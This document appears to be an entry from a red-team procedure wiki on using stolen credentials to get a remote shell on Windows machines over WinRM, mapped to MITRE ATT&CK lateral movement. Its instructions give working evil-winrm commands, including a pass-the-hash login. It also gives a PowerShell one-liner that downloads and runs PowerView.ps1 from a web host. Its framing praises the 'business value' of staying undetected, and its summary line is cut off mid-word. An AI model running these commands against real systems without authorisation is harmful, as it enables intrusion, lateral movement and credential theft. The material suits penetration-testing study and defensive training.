---
id: caca2d7f-2dd1-474a-8457-a097f7314cfc
name: Windows WinRM Credential Access
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:31.219939+00:00'
updated_at: '2023-04-10T20:37:59.611936+00:00'
tactics:
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Remote Services|T1021 - Remote Services]]'
tags:
- '[[Windows - Using credentials]]'
- '[[WinRM Protocol]]'
commands:
- '[[Configure WinRM]]'
- '[[Connect to remote machine using IP address and username]]'
- '[[Connect to remote machine using IP address, username, password and realm]]'
- '[[Connect to remote Windows machine using evil-winrm]]'
- '[[Download PowerView.ps1 script using IEX]]'
---

# Windows WinRM Credential Access

## Summary

Windows Remote Management (WinRM) is a protocol used to remotely manage Windows machines. This procedure focuses on using credentials to gain access to a remote machine via WinRM. With valid credentials, an attacker can use the WinRM protocol to establish a remote shell on a target machine. This ca

## Description

# Description

Windows Remote Management (WinRM) is a protocol used to remotely manage Windows machines. This procedure focuses on using credentials to gain access to a remote machine via WinRM. With valid credentials, an attacker can use the WinRM protocol to establish a remote shell on a target machine. This can provide the attacker with access to sensitive information, such as credentials and data stored on the machine. Additionally, the attacker can use this access to move laterally within the network.

To use this procedure, the attacker needs to have valid credentials for the target machine. Once the credentials are obtained, the attacker can use the 'Enable WinRM' command to enable WinRM on the target machine. The 'Evil-WinRM Command' can then be used to establish a remote shell on the target machine over the WinRM protocol.

The business value of this procedure is that it allows an attacker to gain access to sensitive information on a remote machine without needing to physically access the machine. This can save time and resources for the attacker, while also allowing them to remain undetected.

## Requirements

1. Valid credentials for the target machine

1. Access to the WinRM protocol on the target machine

1. Tools to enable and establish a WinRM session (e.g. Evil-WinRM)

## Defense

1. Ensure that all credentials are strong and unique

1. Implement network segmentation to limit lateral movement

1. Monitor network traffic for any suspicious activity related to WinRM

## Objectives

1. Gain remote access to a target machine

1. Obtain sensitive information from a remote machine

1. Move laterally within a network

# Instructions

1. To enable WinRM on the system, run the 'winrm quickconfig' command in the command prompt. This command will configure WinRM to allow remote management and open the necessary firewall ports.

**Code**: [[winrm quickconfig]]

> WinRM (Windows Remote Management) is a protocol used for remote management of Windows systems. By default, WinRM is not enabled on Windows systems. The 'winrm quickconfig' command is used to quickly enable WinRM on the system. This command configures WinRM to allow remote management and opens the necessary firewall ports to allow remote access. Once WinRM is enabled, you can use it to remotely manage the system using tools like PowerShell or the Remote Server Administration Tools (RSAT).

**Command** ([[Configure WinRM]]):

```bash
winrm quickconfig
```

2. Use the `evil-winrm` command to interact with a remote Windows machine over WinRM. Specify the IP address, username, password, and other details of the remote machine using the available arguments.

**Code**: [[evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXE]]

> The `evil-winrm` command is a powerful tool that can be used to interact with a remote Windows machine over WinRM. It provides various arguments to specify the details of the remote machine, and can be used to execute commands, upload and download files, and perform other tasks on the remote machine. It is a useful tool for system administrators and security professionals who need to manage and secure Windows systems.

**Command** ([[Connect to remote Windows machine using evil-winrm]]):

```bash
evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM]
```

**Command** ([[Connect to remote machine using IP address and username]]):

```bash
evil-winrm -i 10.0.0.20 -u username -H HASH
```

**Command** ([[Connect to remote machine using IP address, username, password and realm]]):

```bash
evil-winrm -i 10.0.0.20 -u username -p password -r domain.local
```

**Command** ([[Download PowerView.ps1 script using IEX]]):

```bash
IEX([Net.Webclient]::new().DownloadString("http://127.0.0.1/PowerView.ps1"))
```

## MITRE ATT&CK Mapping

### Tactics

- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Remote Services|T1021 - Remote Services]]

## Commands Used

- [[Configure WinRM]]
- [[Connect to remote machine using IP address and username]]
- [[Connect to remote machine using IP address, username, password and realm]]
- [[Connect to remote Windows machine using evil-winrm]]
- [[Download PowerView.ps1 script using IEX]]

## Tags

- [[Windows - Using credentials]]
- [[WinRM Protocol]]
